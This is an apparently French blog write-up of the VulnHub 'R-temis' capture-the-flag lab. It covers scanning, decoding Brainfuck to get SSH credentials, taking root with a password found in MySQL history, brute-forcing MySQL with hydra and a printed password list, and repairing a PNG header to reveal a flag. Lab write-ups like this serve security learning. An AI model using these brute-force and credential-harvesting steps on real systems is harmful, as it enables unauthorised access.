---
title: "Solution du CTF R-temis de VulnHub"
tags: [CTF,VulnHub]
---

[R-temis](https://vulnhub.com/entry/r-temis-1,649/) est un petit CTF plus orienté Jeopardy qu'intrusion. Il reste assez simple.

Il y a un MySQL accessible, mais on n'en aura finalement pas besoin.

```
Nmap scan report for 192.168.56.210
Host is up (0.00015s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
3306/tcp open  mysql   MySQL 5.7.32
7223/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
```

Je lance une première énumération :

```
200       34l      228w     4761c http://192.168.56.210/css/
200       23l      131w     2495c http://192.168.56.210/js/
200       18l       78w     1341c http://192.168.56.210/img/
403        9l       28w      279c http://192.168.56.210/icons/
200       20l       95w     1729c http://192.168.56.210/Image/
403        9l       28w      279c http://192.168.56.210/server-status/
200       29l      105w     1274c http://192.168.56.210/
200       15l       49w      737c http://192.168.56.210/ctf/
```

Le dossier `ctf` est vide. Le dossier `Image` contient quelques images, l'une d'elle ne s'affiche pas correctement.

Sur le site, il y a différents indices, l'un laisse entendre qu'il faut chercher un fichier texte. Je le trouve via une énumération :

```
200        7l       52w      308c http://192.168.56.210/easy.txt
```

On obtient deux lignes de `BrainFuck` :

```
+++++ +++++ [->++ +++++ +++<] >++++ +++++ +++++ .++.< +++[- >---< ]>---
---.+ +++++ ++.-- --.<+ ++[-> +++<] >+.<


+++++ +++++ [->++ +++++ +++<] >++++ +++++ +++++ ++.<+ +++++ +[->- -----
-<]>- --..< +++++ ++[-> +++++ ++<]> +.<++ ++[-> ----< ]>.<+ ++++[ ->---
--<]> ----- ----. <++++ +++[- >++++ +++<] >++.. <
```

J'ai utilisé l'interpréteur de *dcode.fr* : [Brainfuck - Langage - Code - Décoder, Encoder en Ligne](https://www.dcode.fr/langage-brainfuck)

Ça me donne ces identifiants : `rtemis` / `t@@rb@ss`

Ils sont valides sur SSH. Je trouve quelques fichiers dans le dossier personnel :

```console
rtemis@debian:~$ find . -type f -ls
   658466      4 -rw-------   1 rtemis   somu          826 Jan  7  2021 ./.bash_history
   658594      4 -rw-------   1 rtemis   somu         2235 Jan  5  2021 ./.mysql_history
   657558      4 -rw-r--r--   1 rtemis   somu         3526 Dec 31  2020 ./.bashrc
   920440      4 -rw-r--r--   1 rtemis   somu          117 Jan  7  2021 ./.hint/pass.txt
   920439      4 -rw-r--r--   1 rtemis   somu          112 Jan  7  2021 ./.hint/user.txt
   657560      4 -rw-r--r--   1 rtemis   somu          220 Dec 31  2020 ./.bash_logout
   657562      4 -rw-r--r--   1 rtemis   somu          807 Dec 31  2020 ./.profile
rtemis@debian:~$ cat .hint/*
mustang
michael
shadow
master
jennifer
111111
2000
toor
toor123
toor@
jordan
superman
harley
1234567
fuckme
hunter


password
123456
12345678
1234
qwerty
12345
dragon
pussy
baseball
football
letmein
monkey
696969
abc123
somu
raj
```

Pour ce qui est de la seconde liste (utilisateurs) je fais vite le tri, car dans l'historique bash on peut voir cette commande :

```bash
mysql -u somu -p
```

Et dans l'historique MySQL :

```sql
INSERT INTO secret values ('root', 'H@ckMe');
```

On peut s'en servir directement pour récupérer le compte `root` :

```console
rtemis@debian:~$ su 
Password: 
root@debian:/home/somu# id
uid=0(root) gid=0(root) groups=0(root)
root@debian:/home/somu# cd /root
root@debian:~# ls
flag2.txt
root@debian:~# cat flag2.txt 
R777N1k
```

Si l'auteur du CTF avait correctement nettoyé derrière lui on aurait effectué un bruteforce à l'aide des wordlists. Mais comme l'utilisateur fait partie du groupe `somu` ça ne laisse que peu de doutes sur le nom d'utilisateur.

```console
$ hydra -l somu -P pass.txt mysql://192.168.56.210
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-05-19 10:20:13
[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
[DATA] max 4 tasks per 1 server, overall 4 tasks, 16 login tries (l:1/p:16), ~4 tries per task
[DATA] attacking mysql://192.168.56.210:3306/
[3306][mysql] host: 192.168.56.210   login: somu   password: toor123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-05-19 10:20:14
```

Revenons sur le premier flag, il s'agit de l'image invalide.

On peut voir que l'entête est endommagé, visiblement uniquement les 4 premiers octets :

```console
$ hexdump -C -n 20 flag1.png 
00000000  00 55 49 45 0d 0a 1a 0a  00 00 00 0d 49 48 44 52  |.UIE........IHDR|
00000010  00 00 02 a0                                       |....|
00000014
$ hexdump -C -n 20 logo.png 
00000000  89 50 4e 47 0d 0a 1a 0a  00 00 00 0d 49 48 44 52  |.PNG........IHDR|
00000010  00 00 08 e1                                       |....|
00000014
```

On peut corriger en écrasant avec `dd` :

```console
$ echo -e -n "\x89PNG" | dd of=flag1.png bs=1 conv=notrunc
4+0 enregistrements lus
4+0 enregistrements écrits
4 octets copiés, 7,6401e-05 s, 52,4 kB/s
```

On ouvre l'image qui affiche le flag `1RY_H4RD3R`
